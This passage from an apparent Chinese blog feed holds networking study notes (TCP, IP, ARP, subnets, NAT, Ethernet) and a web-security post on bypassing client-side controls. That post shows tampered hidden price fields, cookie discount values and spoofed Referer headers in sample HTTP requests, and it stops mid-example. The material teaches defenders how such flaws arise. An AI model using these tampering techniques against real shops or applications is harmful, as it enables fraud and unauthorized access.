title="TCP保证传输可靠性的方法"></a>TCP保证传输可靠性的方法</h5><ul><li>数据包校验：目的是检测数据在传输过程中的任何变化，若校验出包有错，则丢弃报文段并且不给出响应，这时TCP发送数据端超时后会重发数据；</li><li>对失序数据包重排序：既然TCP报文段作为IP数据报来传输，而IP数据报的到达可能会失序，因此TCP报文段的到达也可能会失序。TCP将对失序数据进行重新排序，然后才交给应用层；</li><li>丢弃重复数据：对于重复数据，能够丢弃重复数据；</li><li>应答机制：当TCP收到发自TCP连接另一端的数据，它将发送一个确认。这个确认不是立即发送，通常将推迟几分之一秒；</li><li>超时重发：当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段；</li><li>流量控制：TCP连接的每一方都有固定大小的缓冲空间。TCP的接收端只允许另一端发送接收端缓冲区所能接纳的数据，这可以防止较快主机致使较慢主机的缓冲区溢出，这就是流量控制。TCP使用的流量控制协议是可变大小的滑动窗口协议。</li></ul><h4 id="UDP服务"><a href="#UDP服务" class="headerlink" title="UDP服务"></a>UDP服务</h4><p>UDP是一种不提供不必要服务的轻量级运输协议，它仅提供最小服务。UDP是无连接的，因此两个进程之间没有握手过程。UDP提供的是一种不可靠的数据传送服务，也就是说,UDP并不保证将报文送达到接收进程，而且，到达进程的顺序可能是混乱的。UDP也没有拥塞机制。</p><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><ul><li>运行在计算机中的进程使用进程标识符来标识的。</li><li>由于不同的操作系统使用不同格式的进程标识符，为了能够使不同操作系统的计算机的应用进程能够相互通信，就必须使用统一的方法对TCP/IP体系的应用进程进行标志</li></ul><p>解决上述问题的办法就是在运输层使用协议端口号(只有应用层协议有端口号)：</p><ul><li>端口用一个16位端口号进行标志</li><li>端口号只具有本地意义，即端口号只是为了标志本计算机应用层中的各进程，在因特网中不同的计算机的相同端口号是没有联系的。</li></ul><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="虚电路"><a href="#虚电路" class="headerlink" title="虚电路"></a>虚电路</h3><p>虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发的方式传送，而并不是真正建立了一条物理连接。</p><h3 id="网络层设计思路"><a href="#网络层设计思路" class="headerlink" title="网络层设计思路"></a>网络层设计思路</h3><ul><li>网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务</li><li>网络在发送分组时不需要先建立连接，每一个分组(IP数据报)独立发送，与其前后分组无关</li><li>网络层不提供服务质量的承诺，即所传送的分组可能出错、丢失、重复、乱序到达，当然也不保证分组传送的时限。</li></ul><h3 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h3><p>网络互相连接起来要使用一些中间设备，中间设备又称为中间系统或中继(relay)系统：</p><ul><li>物理层中继系统：转发器(repeater)</li><li>数据链路层中继系统：网桥或桥接器(bridge)</li><li>网络层中继系统：路由器(router)</li><li>网桥和路由器的混合物：桥路器(brouter)</li><li>网络层以上的中继系统：网关(gateway)</li></ul><p>分组在互联网中的传送如图所示：<br><img src="https://ae01.alicdn.com/kf/H27ffef8f9ef94c10bf62a0a5c6af1390p.jpg" alt=""></p><h4 id="分类的IP地址"><a href="#分类的IP地址" class="headerlink" title="分类的IP地址"></a>分类的IP地址</h4><p>我们把整个因特网看成一个单一的、抽象的网络，IP地址就是给每个连接在因特网上的主机(或路由器)分配一个在全世界范围内唯一的32位标识符。</p><h5 id="地址格式"><a href="#地址格式" class="headerlink" title="地址格式"></a>地址格式</h5><p>每一类地址都由两个固定长度的字段组成。其中一个字段是net-id,另一个字段是主机号host-id,它标志该主机(或路由器)。<br>IP地址中的网络号字段和主机号字段如下图所示：<br><img src="https://ae01.alicdn.com/kf/Hbf407c8274d8495aafffe7b33a4dd7a6C.jpg" alt=""></p><h5 id="点分十进制记法"><a href="#点分十进制记法" class="headerlink" title="点分十进制记法"></a>点分十进制记法</h5><p><img src="https://pic2.superbed.cn/item/5de4ac80119afd7d7ec4e70d.jpg" alt=""></p><h5 id="IP地址的特点"><a href="#IP地址的特点" class="headerlink" title="IP地址的特点"></a>IP地址的特点</h5><ol><li>IP地址是一种分等级的地址结构：</li></ol><ul><li>IP地址管理机构在分配IP地址时只分配网络号，而剩下的主机号则由得到该网络号的单位自行分配</li><li>路由器仅根据目的主机所连接的网络号来转发分组，而不考虑目的主机号</li></ul><ol start="2"><li>实际上IP地址是标志一个主机(或路由器)和一条链路的接口</li></ol><ul><li>当一个主机同时连接到两个网络上时，该主机必须同时具有两个相应的IP地址，其网络号必须是不同的，这种主机称为多归属主机</li><li>由于一个路由器至少应当连接到两个网络，因此一个路由器至少应该有两个不同的IP地址</li></ul><ol start="3"><li>用转发器据或网桥连接起来的若干个局域网仍为一个网络，因此这些局域网都具有相同的网络号</li></ol><p><img src="https://ae01.alicdn.com/kf/Hac27e2c4f05f49bd990129b0e4839e5cb.jpg" alt=""><br>如上图所示，在同一个局域网上的主机或路由器的IP地址中的网络号(在同一网段)必须是一样的，路由器的每个接口都拥有不同网络号的IP地址</p><blockquote><p>注：只有在同一网段的主机才能互相通信</p></blockquote><h3 id="ARP和RARP"><a href="#ARP和RARP" class="headerlink" title="ARP和RARP"></a>ARP和RARP</h3><h4 id="IP地址和硬件地址"><a href="#IP地址和硬件地址" class="headerlink" title="IP地址和硬件地址"></a>IP地址和硬件地址</h4><p><img src="https://pic1.superbed.cn/item/5de4aa92119afd7d7ec476d4.jpg" alt=""><br>如上图所示，在IP层抽象的互联网上只能看到IP数据报，路由器只根据目的站的IP地址的网络序号进行路由选择。<br>在具体的物理网络的链路层上，只能看见MAC帧而看不见IP数据报。<br>所以在数据报传输过程中，需要将IP地址和MAC地址进行转化。</p><h4 id="地址解析协议ARP"><a href="#地址解析协议ARP" class="headerlink" title="地址解析协议ARP"></a>地址解析协议ARP</h4><ul><li>不管网络层使用的是什么协议，在实际网络的链路上传送数据帧时，最终还是必须使用硬件地址。</li><li>每个主机都设有一个ARP高速缓存，里面有所在局域网上的各主机和路由器的IP地址到硬件地址的映射表</li><li>当主机A欲向本局域网上的某个主机B发送IP数据报时，就先在其ARP高速缓存中查看有无主机B的IP地址。如有，就可查出其对应的硬件地址，在将此硬件地址写入MAC帧，然后通过局域网将该MAC帧发往此硬件地址。</li><li>ARP是解决同一个局域网上的主机或路由器的IP地址和硬件地址的映射问题。如果要找到主机和源主机不在同一个局域网上，那么就要通过ARP找到一个位于本局域网上的某个路由器的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络，剩下的工作就由下一个网络来做<h3 id="IP层转发分组的流程"><a href="#IP层转发分组的流程" class="headerlink" title="IP层转发分组的流程"></a>IP层转发分组的流程</h3>网络层的路由器之间使用路由表来进行寻址，根据目的网络地址就能确定下一跳路由器。<blockquote><p>注：IP数据报的首部没有地方可以用来指出下一跳路由器的IP地址，而是将下一跳路由器的IP地址送交给下层的网络接口软件，ARP将其转换成硬件地址，然后根据这个硬件地址找到下一跳路由器。</p></blockquote></li></ul><h3 id="划分子网和构造超网"><a href="#划分子网和构造超网" class="headerlink" title="划分子网和构造超网"></a>划分子网和构造超网</h3><h4 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a>划分子网</h4><p>划分子网属于一个单位内部的事情，单位对外仍然表现为没有划分子网的网络。</p><p>一个IP编址与接口的例子如下图所示：<br><img src="https://pic1.superbed.cn/item/5de4aaaa119afd7d7ec47b4d.jpg" alt=""></p><ul><li>上图IP地址的左侧24比特(即IP地址用.分隔开的前三个部分)相同的网络形成一个子网(subnet)，即图中左侧三个主机接口与1个路由器接口的网络形成一个子网。</li><li>IP编码为该子网分配了一个地址：223.1.10/24。其中/24有时称为子网掩码(network mask)，指示了32比特中最左侧24比特定义了子网地址。</li><li>任何要连接到223.1.1.0/24网络的主机都要求其地址具有223.1.1.xxx的形式<br>一个具有多个以太网段和点对点链路的组织将具有多个子网，在给定的子网上的所有设备都具有相同的子网地址。原则上，不同的子网可以具有完全不同的子网地址。</li></ul><h5 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h5><p>使用子网掩码可以找出IP地址中的子网部分，IP地址与子网掩码进行与运算可以得出子网的网络地址。</p><h5 id="CIDR"><a href="#CIDR" class="headerlink" title="CIDR"></a>CIDR</h5><p>因特网的地址分配策略叫做无类别域间路由选择(Classless InterDomain Routing,CIDR)。CIDR将子网寻址的概念一般化了， 因为对于子网寻址，32比特的IP地址被划分为两部分，并且也具有点分十进制数的形式a.b.c.d/x，其中x指示了地址的第一部分中的比特数。地址的x最高比特构成了IP地址的网络部分，并且经常被称为该地址的前缀(prefix)，一个组织经常被分配一块连续的地址，即具有相同前缀的一段地址。</p><h5 id="构成超网"><a href="#构成超网" class="headerlink" title="构成超网"></a>构成超网</h5><p>前缀长度不超过23位的CIDR地址块都包含了多个C类地址，这些C类地址合起来就构成了超网。</p><h3 id="国际控制报文协议ICMP"><a href="#国际控制报文协议ICMP" class="headerlink" title="国际控制报文协议ICMP"></a>国际控制报文协议ICMP</h3><ul><li>作用：网络探测/路由跟踪/错误反馈</li><li>ICMP不是高层协议，而是IP层协议</li><li>ICMP报文作为IP层数据报的数据，加上数据报的首部，组成IP数据报发送出去</li><li>使用ping命令发送的就是ICMP数据包(ICMP字段：8 ping请求/0 ping应答/3 目标主机不可达)</li></ul><h4 id="ICMP报文的种类"><a href="#ICMP报文的种类" class="headerlink" title="ICMP报文的种类"></a>ICMP报文的种类</h4><p>ICMP报文的种类有两种，即ICMP差错报告报文和ICMP询问报文</p><h3 id="虚拟专用网VPN和网络地址转换NAT"><a href="#虚拟专用网VPN和网络地址转换NAT" class="headerlink" title="虚拟专用网VPN和网络地址转换NAT"></a>虚拟专用网VPN和网络地址转换NAT</h3><h4 id="虚拟专用网VPN"><a href="#虚拟专用网VPN" class="headerlink" title="虚拟专用网VPN"></a>虚拟专用网VPN</h4><ul><li>本地地址：仅在机构内部使用的IP地址，可以由本机构自行分配，不需要向因特网的管理机构申请</li><li>全球地址：全球唯一的IP地址，必须向因特网的管理机构申请</li></ul><p>虚拟专用网是用隧道技术实现的：<br><img src="https://pic.superbed.cn/item/5de4ab0f119afd7d7ec49450.jpg" alt=""></p><h5 id="远程接入VPN"><a href="#远程接入VPN" class="headerlink" title="远程接入VPN"></a>远程接入VPN</h5><p>比如在外地工作的员工需要和公司保持联系，远程接入VPN可满足这种需求：在外地工作的员工拨号接入因特网，而驻留在员工PC机中的VPN软件可在员工的PC机和公司的主机之间建立VPN隧道，因而外地员工与公司内部通信的内容都是保密的。</p><h4 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h4><ul><li>需要在专用网连接到因特网的路由器上安装NAT软件，装有NAT软件的路由器叫做NAT路由器，它至少有一个有效的外部全球地址IPg</li><li>所有使用本地地址的主机在和外界通信时都要在NAT路由器上将其本地地址转换成IPg才能和因特网连接。</li></ul><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>数据链路层使用的信道主要有以下两种类型：</p><ul><li>点对点信道。这种信道使用一对一的点对点通信方式</li><li>广播信道。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发送</li></ul><h3 id="点对点信道的数据链路层"><a href="#点对点信道的数据链路层" class="headerlink" title="点对点信道的数据链路层"></a>点对点信道的数据链路层</h3><ul><li>链路是一条无源的点到点的物理线路段，中间没有任何其他的交换结点。(一条链路只是一条通路的一个组成部分)</li><li>数据链路除了物理线路外，还必须通过通信协议来控制这些数据的传输</li><li>数据链路上传输的是帧</li></ul><p>数据链路的三个基本功能：</p><ol><li>封装成帧：在一段数据的前后分别添加首部和尾部，确定帧的界限</li><li>透明传输：字节填充或字符填充</li><li>差错传输</li></ol><h3 id="点对点协议PPP"><a href="#点对点协议PPP" class="headerlink" title="点对点协议PPP"></a>点对点协议PPP</h3><p>现在世界上使用得最多的数据链路层协议是点对点协议PPP(Point-to-Point Protocol,PPP)</p><ul><li>用户到ISP的链路使用PPP协议</li></ul><h3 id="局域网的数据链路层"><a href="#局域网的数据链路层" class="headerlink" title="局域网的数据链路层"></a>局域网的数据链路层</h3><p>局域网：网络为一个单位所拥有，且地理范围和站点数目均有限<br>局域网的拓扑结构如下图所示：<br><img src="https://pic1.superbed.cn/item/5de4ab55119afd7d7ec4a60f.jpg" alt=""></p><h4 id="数据链路层的两个子层"><a href="#数据链路层的两个子层" class="headerlink" title="数据链路层的两个子层"></a>数据链路层的两个子层</h4><ul><li>逻辑链路控制LLC(Logical Link Control)子层</li><li>媒体接入控制MAC(Medium Access Control)子层<br>与接入到传输媒体有关的内容都放在MAC子层，而LLC子层则与传输媒体无关，不管采用何种协议的局域网对LLC子层来说都是透明的。(一般不考虑LLC子层)</li></ul><h4 id="适配器的作用"><a href="#适配器的作用" class="headerlink" title="适配器的作用"></a>适配器的作用</h4><p>网络接口板又称为通信适配器(adapter)或网络接口卡NIC(Network Interface Card),或网卡<br>适配器的重要功能：</p><ul><li>进行串行/并行转换</li><li>对数据进行缓存</li><li>在计算机的操作系统安装设备驱动程序</li><li>实现以太网协议</li></ul><h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><p>以太网应当指符合DIX Ethernet V2标准的局域网</p><h4 id="以太网的MAC层"><a href="#以太网的MAC层" class="headerlink" title="以太网的MAC层"></a>以太网的MAC层</h4><ul><li>在局域网中，硬件地址又称为物理地址，或MAC地址</li><li>MAC地址实际上就是48位的适配器地址或适配器标识符</li></ul><h5 id="适配器检查MAC地址"><a href="#适配器检查MAC地址" class="headerlink" title="适配器检查MAC地址"></a>适配器检查MAC地址</h5><p>适配器从网络上每收到一个MAC帧就首先硬件检查MAC帧中的MAC地址。</p><ul><li>如果是发往本站的帧则收下，然后再进行其他的处理</li><li>否则就将此帧丢弃，不再进行其他的处理<br>发往本站的帧包括以下三种：</li><li>单播帧(unicast)：一对一</li><li>广播帧(broadcast)：一对全体</li><li>多播帧(multicast)：一对多</li></ul><h5 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h5><ul><li>在数据链路层扩展局域网的是使用网桥</li><li>网桥工作在数据链路层，它根据MAC帧的目的地址对收到的帧进行转发</li><li>网桥具有过滤帧的功能。当网桥收到一个帧时，并不是向所有的接口转发此帧，而是先检查此帧的目的MAC地址，然后再确定将该帧转发到哪个接口</li></ul><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>物理层的主要任务描述为确定与传输媒体的接口的一些特性，即：</p><ul><li>机械特性</li><li>电气特性</li><li>功能特性</li><li>过程特性</li></ul><h3 id="通信相关的概念"><a href="#通信相关的概念" class="headerlink" title="通信相关的概念"></a>通信相关的概念</h3><ul><li>单向通信(单工)：只能有一个方向的通信而没有反方向的交互</li><li>双向交替通信(半双工)：通信的双方都能发送信息，但不能双方同时发送(当然也不能同时接收)</li><li>双向同时通信(全双工通信)：通信的双方可以同时发送和接收信息。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识点总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(4)</title>
      <link href="/2019/10/23/websecurity4/"/>
      <url>/2019/10/23/websecurity4/</url>
      
        <content type="html"><![CDATA[<h2 id="避开客户端控件"><a href="#避开客户端控件" class="headerlink" title="避开客户端控件"></a>避开客户端控件</h2><p>由于客户端可提交任意输入，Web应用程序的核心安全因此受到威胁。大部分Web应用程序仍然依靠在客户端采取各种措施，对它提交给服务器的数据进行控制。这种做法会导致一个基本的安全缺陷：用户能够完全控制客户端和由其提交的数据，并可以避开任何在客户端执行但服务器不采用的控件。<br>应用程序依靠客户端控件限制用户输入表现在两个方面：</p><ol><li>应用程序可通过客户端控件，使用某种它认为可防止用户修改的机制传送数据</li><li>应用程序在客户端执行保护措施，控制用户和客户端的交互，从而对功能进行限制，并(或)在用户输入之前对这些输入进行控制</li></ol><h2 id="通过客户端传送数据"><a href="#通过客户端传送数据" class="headerlink" title="通过客户端传送数据"></a>通过客户端传送数据</h2><p>应用程序通常以终端用户(最后使用这个产品的用户)无法直接查看或修改的方式向客户端传送数据，希望客户端在随后的请求中将这些数据送回服务器。</p><h3 id="隐藏表单字段"><a href="#隐藏表单字段" class="headerlink" title="隐藏表单字段"></a>隐藏表单字段</h3><ul><li>隐藏HTML表单字段是一种表面上看似无法修改，通过客户端传送数据的常用机制。</li><li>如果一个表单标记为隐藏，它就不会显示在屏幕上，但是，用户提交表单时，保存在表单中的字段名称和值仍被传送给应用程序</li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>典型的表单如下<br><img src="https://i.postimg.cc/X7SqGrq2/1.png" alt=""><br>创建该表单的HTML代码如下</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"post"</span> action<span class="token operator">=</span><span class="token string">"shop.aspx?prod=1"</span><span class="token operator">></span>    Product:HuaWei x30<span class="token operator">&lt;</span>br/<span class="token operator">></span>    Price: 3300<span class="token operator">&lt;</span>br/<span class="token operator">></span>    Quantity:<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"quantity"</span><span class="token operator">></span><span class="token operator">&lt;</span>br/<span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"hidden"</span> name<span class="token operator">=</span><span class="token string">"price"</span> value<span class="token operator">=</span><span class="token string">"3300"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Buy"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>/form<span class="token operator">></span></code></pre><p>注：表单字段名为price，其被标记为隐藏(hidden),用户提交表单时，这个字段将被交送给服务器：</p><pre class=" language-bash"><code class="language-bash">POST /SHOP/shop.aspx?pord<span class="token operator">=</span>1 HTTP/1.1Host: mdsec.netContent-Type: Application/x-www-form-urlencodedContent-Length: 20quantity<span class="token operator">=</span>1<span class="token operator">&amp;</span>price<span class="token operator">=</span>3300</code></pre><p>虽然price字段并未显示在输入框里，用户无法对其进行编辑，但这只是因为应用程序指示浏览器隐藏该字段而已。</p><p>要实现编辑操作，可以对HTML源码进行修改，然后重新载入页面，但是，使用拦截代理服务器对数据进行动态修改更为方便。</p><h3 id="HTTP-cookie"><a href="#HTTP-cookie" class="headerlink" title="HTTP cookie"></a>HTTP cookie</h3><p>HTTP cookie是通过客户端传送数据的另一种常用机制，HTTP cookie一般并不显示在屏幕上，也不可由用户直接修改。用户可以通过拦截代理服务器，通过更改设置cookie的服务器响应或随后发布这些cookie的客户端请求，对HTTP cookie进行修改。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><p>消费者登录应用程序后，收到以下响应</p><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKSet-Cookie: DiscountAgreed<span class="token operator">=</span>25Content-Length: 1530<span class="token punctuation">..</span>.</code></pre><p>DiscountAgreed cookie是依靠客户端控件(基于cookie一般无法被修改这个事实)保护通过客户端传送的数据的典型示例，如果应用程序信任DiscountAgreed cookie返回给服务器的值，那么消费者就可以修改这个值获得任意折扣</p><pre class=" language-bash"><code class="language-bash">POST /shop/shop.aspx?pord<span class="token operator">=</span>3 HTTP/1.1Host: mdsec.netcookie: DiscountAgreed<span class="token operator">=</span>15Content-Length: 10quantity<span class="token operator">=</span>1</code></pre><h3 id="URL参数"><a href="#URL参数" class="headerlink" title="URL参数"></a>URL参数</h3><p>应用程序常常通过预先设定的URL参数通过客户端传送数据。如果包含参数的URL显示在浏览器的地址栏里，任何用户不需要任何工具就可以修改URL的参数</p><h3 id="Referer消息头"><a href="#Referer消息头" class="headerlink" title="Referer消息头"></a>Referer消息头</h3><p>浏览器在大多数HTTP请求中使用Referer消息头，浏览器使用这个消息头指示提出当前请求的页面的URL(或是因为用户单击了一个超链接或提交了一个表单，或者是因为该页面引用了其他资源)。因此，我们可以利用这个消息头向客户端传送数据，这是因为应用程序处理的URL受其控制。</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>忘记密码的用户向服务器提出重制密码的请求</p><pre class=" language-bash"><code class="language-bash">GET /auth/CreateUser.ashx HTTP/1.1Host: mdsec.betReferer: https://mdsec.net/auth/Admin.ashx</code></pre><p>应用程序可以使用Referer证实这个请求是在正确的阶段(Adimin.ashx)提出的，然后才允许用户访问请求的功能(这里指重置密码)。但是，因为用户控制着每个HTTP请求，包括HTTP消息头，他可以进入CreateUser.ashx并使用拦截服务器将Referer消息头的值改为应用程序需要的值，从而轻易避开这种控制</p><h3 id="模糊数据"><a href="#模糊数据" class="headerlink" title="模糊数据"></a>模糊数据</h3><p>对传送的数据进行加密或进行了某种形式的模糊处理。</p><h4 id="ASP-NET-ViewState"><a href="#ASP-NET-ViewState" class="headerlink" title="ASP.NET ViewState"></a>ASP.NET ViewState</h4><ul><li>ASP.NET ViewState是一种通过客户端传送模糊数据的常用机制。</li><li>它是一个由所有ASP.NET Web应用程序默认创建的隐藏字段，其中包含关于当前页面状态的序列化信息。</li><li>服务器通过它在连续提交请求的过程中保存用户界面中的元素，而不需要在服务器端维护所有状态信息。</li><li>ViewState的参数实际上是一个Base64编码字符串。</li><li>ASP.NET平台通过在ViewState中加入一个密钥散列(称为MAC保护)来防止篡改。</li></ul><h2 id="收集用户数据：HTML表单"><a href="#收集用户数据：HTML表单" class="headerlink" title="收集用户数据：HTML表单"></a>收集用户数据：HTML表单</h2><ul><li>HTML表单是一种最简单、最常用的机制，它用于从用户收集输入并将其提交给服务器。</li><li>这种方法的基本应用：用户在已命名的字段中输入数据，再将它们以名/值对的形式提交给服务器。</li></ul><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"post"</span> action<span class="token operator">=</span><span class="token string">"shop.aspx?pord=1"</span><span class="token operator">></span>Quantity: <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"quantity"</span> maxlength<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/form<span class="token operator">></span></code></pre><p>上述HTML语句规定quantity字段的最大长度为1，因此，浏览器将阻止用户在输入字段中输入任何超过一个字符的值，而服务器端引用程序也认为它收到的quantity参数将小于10.但是，通过拦截提交表单的请求，并在其中输入任意值，或拦截包含表单的响应，并删除maxlength属性，就可以轻易避开这种限制。</p><h3 id="基于脚本的确认"><a href="#基于脚本的确认" class="headerlink" title="基于脚本的确认"></a>基于脚本的确认</h3><p>通过Javascript对用户输入进行限制。</p><h3 id="禁用元素"><a href="#禁用元素" class="headerlink" title="禁用元素"></a>禁用元素</h3><p>如果HTML表单中的一个元素被标记为禁用，它会在屏幕上出现，但以灰色显示，并且无法像常规空间那样编辑或使用。提交表单时，表单也不会向服务器传送这个元素。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>form<span class="token operator">></span>Price: <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> disabled<span class="token operator">=</span><span class="token string">"true"</span> name<span class="token operator">=</span><span class="token string">"price"</span> value<span class="token operator">=</span><span class="token string">"200"</span><span class="token operator">></span><span class="token operator">&lt;</span>/form<span class="token operator">></span></code></pre><h2 id="收集用户数据：浏览器扩展"><a href="#收集用户数据：浏览器扩展" class="headerlink" title="收集用户数据：浏览器扩展"></a>收集用户数据：浏览器扩展</h2><p>另一种确认并提交用户数据的主要方法是使用在浏览器扩展中运行的客户端组件(如Java/Flash)</p><ul><li>浏览器扩展可以通过输入表单，或者在某些情况下通过与客户端操作系统的文件系统或注册表交互，以各种不同的方式收集数据。</li><li>在将收集到的数据传给服务器之前，它们可以对这些数据执行任何复杂的确认和处理</li></ul><h3 id="常见的浏览器扩展技术"><a href="#常见的浏览器扩展技术" class="headerlink" title="常见的浏览器扩展技术"></a>常见的浏览器扩展技术</h3><p>常见的浏览器扩展技术包括:Java applet/Flash/Silverlight，它们类似的安全功能包括：</p><ul><li>它们均编译成中间字节码</li><li>它们在提供沙盒(sandbox，是一种安全机制，为运行中的程序提供隔离环境)执行环境的虚拟机中运行</li><li>它们可能会使用远程框架，这类框架采用序列化来传输复杂数据结构，或通过HTTP传送对象。</li></ul><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>java applet在Java虚拟机(JVM)中运行，并采用由Java安全策略应用的沙盒。</p><h4 id="Flash"><a href="#Flash" class="headerlink" title="Flash"></a>Flash</h4><p>Flash对象在Flash虚拟机中运行。和java applet一样，Flash也要在主机上的沙盒中运行</p><h4 id="Silverlight"><a href="#Silverlight" class="headerlink" title="Silverlight"></a>Silverlight</h4><p>Silverlight是微软开发的与Flash类似的产品。该产品主要运用于启动各种桌面应用程序，允许Web应用程序在浏览器内的沙盒环境中提供精简的.NET体验。</p><h3 id="攻击浏览器扩展的方法"><a href="#攻击浏览器扩展的方法" class="headerlink" title="攻击浏览器扩展的方法"></a>攻击浏览器扩展的方法</h3><ul><li>拦截并修改浏览器扩展组件提出的请求及服务器响应，但可能会遇到数据模糊处理或对技术方案进行了序列化的问题</li><li>直接对组件实施攻击，并尝试反编译它的字节码，以查看其源代码；或使用调试器与组件进行动态交互</li></ul><h3 id="拦截浏览器扩展的流量"><a href="#拦截浏览器扩展的流量" class="headerlink" title="拦截浏览器扩展的流量"></a>拦截浏览器扩展的流量</h3><h4 id="处理序列化数据"><a href="#处理序列化数据" class="headerlink" title="处理序列化数据"></a>处理序列化数据</h4><ul><li>序列化：数据序列化就是将对象或者数据结构转化成特定的格式</li><li>应用程序可能会首先对数据或对象进行序列化处理，然后通过HTTP请求传送这些数据或对象。通常而言，需要对序列化数据进行解压缩才能了解这些数据。可以根据所采用的客户端组件推断出相关数据的序列化格式，但是，任何时候，仔细检查相关HTTP消息才能确认序列化格式</li></ul><h5 id="java序列化"><a href="#java序列化" class="headerlink" title="java序列化"></a>java序列化</h5><p>java语言本身支持对象的序列化。而且，java applet可能会以这种方式在客户端与服务器应用程序组件之间传送序列化数据结构。通常序列化java对象会使用Content-Type消息头：</p><pre class=" language-bash"><code class="language-bash">Content-Length: application/x-java-serialized-object</code></pre><h5 id="Flash序列化"><a href="#Flash序列化" class="headerlink" title="Flash序列化"></a>Flash序列化</h5><p>Flash使用自己的可用于在服务器和客户端组件之间传输复杂数据结构的序列化格式，通常可以通过以下Content-Type消息头辨别动作信息格式(AMF)：</p><pre class=" language-bash"><code class="language-bash">Content-Type: application/x-amf</code></pre><h5 id="Silverlight序列化"><a href="#Silverlight序列化" class="headerlink" title="Silverlight序列化"></a>Silverlight序列化</h5><p>Silverlight应用程序能够利用.NET平台内置的Windows通信基础(WCF)远程框架。使用WCF的Silverlight客户端组件通常采用微软的用于SOAP的.NET二进制格式，可以通过Content-Type消息头辨别该格式：</p><pre class=" language-bash"><code class="language-bash">Content-Type: application/soap+msbin1</code></pre><h4 id="拦截浏览器扩展流量时遇到的障碍"><a href="#拦截浏览器扩展流量时遇到的障碍" class="headerlink" title="拦截浏览器扩展流量时遇到的障碍"></a>拦截浏览器扩展流量时遇到的障碍</h4><p>如果浏览器已设置成使用拦截代理服务器，代理服务器可能并不会拦截，或无法拦截浏览器扩展组件提出的请求。之所以出现这种情况，可能是由于组件的HTTP代理或SSL出现问题。产生这个问题的原因主要有：</p><ol><li>客户端组件可能并不执行在浏览器或计算机的设置中指定的代理配置，这是因为组件可能会在浏览器本身或扩展框架提供的API以外发出它们自己的HTTP请求。</li></ol><ul><li>解决方案：修改计算机的hosts文件，同时将代理服务器配置为支持匿名代理，并自动重定向到正确的主机</li></ul><ol start="2"><li>客户端组件可能不接受代理服务器提供的SSL证书</li></ol><ul><li>解决方案： 将代理服务器配置为使用一个主CA证书(用于为访问的每个站点的每台主机签署有效的证书)，并在计算机的可信证书库中安装该CA证书。 </li></ul><ol start="3"><li>客户端组件使用除HTTP以外的协议进行通信，而拦截代理服务器却无法处理这些协议。</li></ol><ul><li>解决方案：使用网络嗅探器或功能挂钩工具查看并修改相关流量(比如Echo Mirage)</li></ul><h3 id="反编译浏览器扩展"><a href="#反编译浏览器扩展" class="headerlink" title="反编译浏览器扩展"></a>反编译浏览器扩展</h3><ul><li>在对浏览器扩展组件实施攻击时，最彻底的方法，是反编译对象、对源代码进行全面分析，修改源代码以该改变对象行为，然后重新编译源代码</li><li>字节码：字节码是一种有相关解释器(如Java虚拟机或Flash播放器)执行的、不依赖于特定平台的高级二进制表示形式，每种浏览器扩展技术都使用它们自己的字节码格式，因此，浏览器扩展可在解释器本身可运行的任何平台上运行。</li></ul><h4 id="反编译字节码流程"><a href="#反编译字节码流程" class="headerlink" title="反编译字节码流程"></a>反编译字节码流程</h4><h5 id="下载字节码"><a href="#下载字节码" class="headerlink" title="下载字节码"></a>下载字节码</h5><p>第一步是下载要处理的可执行字节码。一般情况下，字节码会从HTML源代码(运行浏览器扩展的应用程序页面)中指定的URL加载到单独的文件中。Java applet通常使用&lt; applet&gt;标签加载，其他组件则使用&lt; object&gt;标签加载</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>applet code<span class="token operator">=</span><span class="token 